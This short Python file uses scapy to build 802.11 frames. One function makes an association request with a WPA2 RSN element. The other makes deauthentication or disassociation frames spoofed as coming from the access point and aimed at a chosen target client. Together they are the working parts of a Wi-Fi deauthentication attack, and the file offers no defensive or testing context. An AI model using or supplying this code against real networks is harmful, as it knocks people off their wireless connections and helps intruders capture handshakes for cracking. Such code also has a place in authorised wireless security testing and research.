from scapy.all import RadioTap, Dot11, Dot11Elt, Dot11Deauth, Dot11Disas, Dot11AssoReq

RSN_ID = 48

def assoc_req(bssid, client, ssid):
    rsn = (b"\x01\x00" b"\x00\x0f\xac\x04" b"\x01\x00"
           b"\x00\x0f\xac\x04" b"\x01\x00" b"\x00\x0f\xac\x02" b"\x00\x00")
    return (RadioTap()
            / Dot11(type=0, subtype=0, addr1=bssid, addr2=client, addr3=bssid)
            / Dot11AssoReq(cap=0x0431, listen_interval=10)
            / Dot11Elt(ID=0, info=ssid.encode(errors="ignore"))
            / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
            / Dot11Elt(ID=RSN_ID, info=rsn))

def deauth_frame(bssid, hedef, tip, reason):
    if tip == "disassoc":
        return (RadioTap() / Dot11(type=0, subtype=10, addr1=hedef, addr2=bssid, addr3=bssid) / Dot11Disas(reason=reason))
    return (RadioTap() / Dot11(type=0, subtype=12, addr1=hedef, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=reason))
